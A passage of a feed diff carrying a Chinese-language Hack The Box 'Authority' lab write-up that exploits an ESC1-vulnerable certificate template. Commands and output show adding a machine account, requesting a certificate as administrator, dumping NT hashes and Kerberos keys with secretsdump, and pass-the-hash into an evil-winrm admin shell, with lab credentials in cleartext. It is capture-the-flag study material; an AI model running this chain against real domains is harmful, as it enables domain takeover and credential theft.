+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">37</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">13</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">21</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;AUTHORITY-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully retrieved CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;AUTHORITY-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;AUTHORITY-CA&#39;</span> @ <span style="color:#e6db74">&#39;authority.authority.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : AUTHORITY-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : authority.authority.htb
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>AUTHORITY-CA, DC<span style="color:#f92672">=</span>authority, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2123-04-24 01:56:25+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Disabled
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Issue
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Enabled
+</span></span><span style="display:flex;"><span>    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Owner                             : AUTHORITY.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>      Access Rights
+</span></span><span style="display:flex;"><span>        ManageCa                        : AUTHORITY.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        ManageCertificates              : AUTHORITY.HTB<span style="color:#ae81ff">\A</span>dministrators
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Enroll                          : AUTHORITY.HTB<span style="color:#ae81ff">\A</span>uthenticated Users
+</span></span><span style="display:flex;"><span>Certificate Templates
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Template Name                       : CorpVPN
+</span></span><span style="display:flex;"><span>    Display Name                        : Corp VPN
+</span></span><span style="display:flex;"><span>    Certificate Authorities             : AUTHORITY-CA
+</span></span><span style="display:flex;"><span>    Enabled                             : True
+</span></span><span style="display:flex;"><span>    Client Authentication               : True
+</span></span><span style="display:flex;"><span>    Enrollment Agent                    : False
+</span></span><span style="display:flex;"><span>    Any Purpose                         : False
+</span></span><span style="display:flex;"><span>    Enrollee Supplies Subject           : True
+</span></span><span style="display:flex;"><span>    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span style="display:flex;"><span>    Enrollment Flag                     : IncludeSymmetricAlgorithms
+</span></span><span style="display:flex;"><span>                                          PublishToDs
+</span></span><span style="display:flex;"><span>                                          AutoEnrollmentCheckUserDsCertificate
+</span></span><span style="display:flex;"><span>    Private Key Flag                    : ExportableKey
+</span></span><span style="display:flex;"><span>    Extended Key Usage                  : Encrypting File System
+</span></span><span style="display:flex;"><span>                                          Secure Email
+</span></span><span style="display:flex;"><span>                                          Client Authentication
+</span></span><span style="display:flex;"><span>                                          Document Signing
+</span></span><span style="display:flex;"><span>                                          IP security IKE intermediate
+</span></span><span style="display:flex;"><span>                                          IP security use
+</span></span><span style="display:flex;"><span>                                          KDC Authentication
+</span></span><span style="display:flex;"><span>    Requires Manager Approval           : False
+</span></span><span style="display:flex;"><span>    Requires Key Archival               : False
+</span></span><span style="display:flex;"><span>    Authorized Signatures Required      : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    Schema Version                      : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    Validity Period                     : <span style="color:#ae81ff">20</span> years
+</span></span><span style="display:flex;"><span>    Renewal Period                      : <span style="color:#ae81ff">6</span> weeks
+</span></span><span style="display:flex;"><span>    Minimum RSA Key Length              : <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>    Template Created                    : 2023-03-24T23:48:09+00:00
+</span></span><span style="display:flex;"><span>    Template Last Modified              : 2023-03-24T23:48:11+00:00
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Enrollment Permissions
+</span></span><span style="display:flex;"><span>        Enrollment Rights               : AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Computers
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>      Object Control Permissions
+</span></span><span style="display:flex;"><span>        Owner                           : AUTHORITY.HTB<span style="color:#ae81ff">\A</span>dministrator
+</span></span><span style="display:flex;"><span>        Full Control Principals         : AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Owner Principals          : AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Dacl Principals           : AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>        Write Property Enroll           : AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Admins
+</span></span><span style="display:flex;"><span>                                          AUTHORITY.HTB<span style="color:#ae81ff">\E</span>nterprise Admins
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Enrollable Principals      : AUTHORITY.HTB<span style="color:#ae81ff">\D</span>omain Computers
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerabilities
+</span></span><span style="display:flex;"><span>      ESC1                              : Enrollee supplies subject and template allows client authentication.
+</span></span></code></pre></div><p>CorpVPN 容易受到 ESC1 攻击。</p>
+<p>Ldapsearch 查询到机器账户默认配额是 10。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ LDAPTLS_REQCERT<span style="color:#f92672">=</span>never ldapsearch -x -LLL -H ldaps://10.129.229.56:636 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -D <span style="color:#e6db74">&#39;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -w <span style="color:#e6db74">&#39;lDaP_1n_th3_cle4r!&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#39;DC=authority,DC=htb&#39;</span> -s base <span style="color:#e6db74">&#39;(objectClass=*)&#39;</span> ms-DS-MachineAccountQuota
+</span></span><span style="display:flex;"><span>dn: DC<span style="color:#f92672">=</span>authority,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>ms-DS-MachineAccountQuota: <span style="color:#ae81ff">10</span>
+</span></span></code></pre></div><p>新建一个 <code>PC01$</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-addcomputer -computer-name <span style="color:#e6db74">&#39;PC01$&#39;</span> -computer-pass <span style="color:#e6db74">&#39;Enil222&#39;</span> -dc-ip 10.129.229.56 <span style="color:#e6db74">&#39;authority.htb/svc_ldap:lDaP_1n_th3_cle4r!&#39;</span>                             
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added machine account PC01$ with password Enil222.
+</span></span></code></pre></div><p>nxc 查询到 administrator 的 sid。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap 10.129.229.56 -u svc_ldap -p <span style="color:#e6db74">&#39;lDaP_1n_th3_cle4r!&#39;</span> --query <span style="color:#e6db74">&#34;(sAMAccountName=administrator)&#34;</span> <span style="color:#e6db74">&#34;objectSid&#34;</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.229.56   <span style="color:#ae81ff">389</span>    AUTHORITY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:AUTHORITY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:authority.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:Enforced<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.229.56   <span style="color:#ae81ff">389</span>    AUTHORITY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> authority.htb<span style="color:#ae81ff">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
+</span></span><span style="display:flex;"><span>LDAP        10.129.229.56   <span style="color:#ae81ff">389</span>    AUTHORITY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Response <span style="color:#66d9ef">for</span> object: CN<span style="color:#f92672">=</span>Administrator,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>authority,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>LDAP        10.129.229.56   <span style="color:#ae81ff">389</span>    AUTHORITY        objectSid            S-1-5-21-622327497-3269355298-2248959698-500
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.229.56 -u <span style="color:#e6db74">&#39;PC01$&#39;</span> -p <span style="color:#e6db74">&#39;Enil222&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:AUTHORITY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:authority.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.56   <span style="color:#ae81ff">445</span>    AUTHORITY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> authority.htb<span style="color:#ae81ff">\P</span>C01$:Enil222
+</span></span></code></pre></div><p>使用刚创建的 <code>PC01$</code> 签出证书。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy-ad req -u <span style="color:#e6db74">&#39;PC01$@authority.htb&#39;</span> -p <span style="color:#e6db74">&#39;Enil222&#39;</span> -dc-ip 10.129.229.56 -ca <span style="color:#e6db74">&#39;AUTHORITY-CA&#39;</span> -template <span style="color:#e6db74">&#39;CorpVPN&#39;</span> -upn <span style="color:#e6db74">&#39;administrator@authority.htb&#39;</span> -sid <span style="color:#e6db74">&#39;S-1-5-21-622327497-3269355298-2248959698-500&#39;</span>
+</span></span><span style="display:flex;"><span>Certipy v5.0.4 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;administrator@authority.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate object SID is <span style="color:#e6db74">&#39;S-1-5-21-622327497-3269355298-2248959698-500&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving certificate and private key to <span style="color:#e6db74">&#39;administrator.pfx&#39;</span>
+</span></span><span style="display:flex;"><span>File <span style="color:#e6db74">&#39;administrator.pfx&#39;</span> already exists. Overwrite? <span style="color:#f92672">(</span>y/n - saying no will save with a unique filename<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Wrote certificate and private key to <span style="color:#e6db74">&#39;administrator_f55f343f-f851-47b4-aa5d-55d6841d803e.pfx&#39;</span>
+</span></span></code></pre></div><p>administrator 的 NT hash 到手。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-secretsdump <span style="color:#e6db74">&#39;authority.htb/svc_ldap:lDaP_1n_th3_cle4r!@10.129.229.56&#39;</span> -just-dc-user administrator
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
+</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
+</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
+</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:8ad3d50efed66b16
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm 10.129.229.56 -u administrator -H 6961f422924da90a6928197429eea4ed
+</span></span><span style="display:flex;"><span>WINRM       10.129.229.56   <span style="color:#ae81ff">5985</span>   AUTHORITY        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:AUTHORITY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:authority.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.229.56   <span style="color:#ae81ff">5985</span>   AUTHORITY        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> authority.htb<span style="color:#ae81ff">\a</span>dministrator:6961f422924da90a6928197429eea4ed <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Authority<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.229.56 -u administrator -H 6961f422924da90a6928197429eea4ed
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>htb<span style="color:#ae81ff">\a</span>dministrator
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>HTB-Access Writeup</title>
